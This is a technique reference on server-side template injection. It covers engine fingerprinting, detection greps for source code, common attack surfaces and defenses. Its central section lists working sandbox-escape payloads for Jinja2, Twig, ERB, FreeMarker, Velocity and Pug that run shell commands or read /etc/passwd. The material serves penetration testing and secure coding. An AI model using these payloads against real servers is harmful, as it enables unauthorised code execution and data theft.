# Server-side template injection — technique reference

## 1. Mental model

User input is concatenated into a server-side template before rendering.
Template engines have language-level features (variables, expressions,
function calls); injecting their syntax can lead to data leak → RCE.

Difference from XSS: XSS executes client-side; SSTI executes inside the
server-side template-engine sandbox (often weak, often exploitable into
full code execution on the host).

## 2. Engine identification

Distinct syntax patterns. Send `${7*7}{{7*7}}<%= 7*7 %>#{7*7}` and observe
which produced 49.

| Engine | Syntax | Language |
|--------|--------|----------|
| Jinja2 | `{{7*7}}` → 49, `{%...%}` | Python |
| Twig | `{{7*7}}` → 49, `{%...%}` | PHP |
| Mustache | `{{var}}` only — no expressions | many |
| Handlebars | `{{var}}`, helpers | JS |
| ERB | `<%= 7*7 %>` → 49 | Ruby |
| Slim / HAML | `= 7*7` | Ruby |
| Liquid | `{{ 7 \| times: 7 }}` | Ruby (Shopify) |
| Thymeleaf | `${7*7}` → 49, `[[${...}]]` | Java |
| FreeMarker | `${7*7}` → 49, `<#... />` | Java |
| Velocity | `#set($x=7*7)$x` → 49 | Java |
| Razor | `@(7*7)` → 49 | C# |
| Pug / Jade | `#{7*7}` → 49 | JS |
| Smarty | `{$smarty.version}` reflects version | PHP |
| Tornado | `{{7*7}}` | Python |
| Pebble | `{{7*7}}` | Java |

Some apps render Markdown / Liquid before HTML; chain may go through
multiple engines.

## 3. Confirmation & sandbox escape

### 3.1 Jinja2 (most-tested)

```
{{config}}                               # leaks config dict
{{config.items()}}
{{request.application.__globals__.__builtins__}}   # if Flask
{{''.__class__.__mro__[1].__subclasses__()}}      # iterate subclasses
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[<INDEX>]("id",shell=True,stdout=-1).communicate()}}
```

The `<INDEX>` is the index of `subprocess.Popen` in the subclasses list;
it varies. Loop:

```
{% for x in ''.__class__.__mro__[1].__subclasses__() %}{{loop.index}}: {{x}}
{% endfor %}
```

### 3.2 Twig

```
{{ _self.env.registerUndefinedFilterCallback("system") }}
{{ _self.env.getFilter("id") }}

# Twig >=2 (sandbox tightened):
{{['id']|filter('system')}}
```

### 3.3 ERB / Ruby

```
<%= `id` %>                # backtick exec
<%= system('id') %>
<%= File.open('/etc/passwd').read %>
```

### 3.4 FreeMarker

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 3.5 Velocity

```
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### 3.6 Handlebars

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      ...
```

(Multi-step gadget; see PortSwigger research for current version.)

### 3.7 Pug

```
#{root.process.mainModule.require('child_process').execSync('id')}
```

## 4. Detection in source

```
grep -rEn "render_template_string|Template\(.*\$" --include='*.py'
grep -rEn "Twig_Loader_String|new Twig\(.*request" --include='*.php'
grep -rEn "ERB\.new\(.*params" --include='*.rb'
grep -rEn "Mustache\.render\(.*req|Handlebars\.compile\(.*req" --include='*.js'
grep -rEn "TemplateImpl|FreeMarkerView|VelocityEngine.*evaluate" --include='*.java'
```

Flag: any template compiled or rendered with a string sourced from request
input (URL, body, headers, DB-backed if user-controlled).

## 5. Common surfaces

- Email templating (subject / body customizable per tenant)
- Report generators (CSV / PDF templates with user fields)
- Admin-configurable pages / themes (Shopify Liquid, Ghost)
- Notification templates
- Welcome / onboarding emails with username substitution
- "Custom domain landing page" features
- WYSIWYG editor with template variables
- Markdown engines that auto-process Mustache-like

## 6. Defenses

1. **Don't render user input as a template.** Render user data INTO a
   template. Distinct: template = trusted developer asset; data = parameter.
2. **If user input must influence template structure**, sandbox aggressively
   (Twig sandbox, Jinja2 SandboxedEnvironment) and review every allowed
   filter/global.
3. **Logical separation** between template author (admin / developer) and
   template data provider (any user) — different trust tiers.
4. **No reflective globals** in template scope (`config`, `os`, `process`).

## 7. CWE / standards

- CWE-1336 — Improper neutralisation of special elements used in a template
- CWE-94 — Code injection
- OWASP WSTG WSTG-INPV-18

## 8. Tools

- **tplmap** — automated SSTI detection & exploitation across engines
- **PayloadsAllTheThings** SSTI directory — payload reference per engine
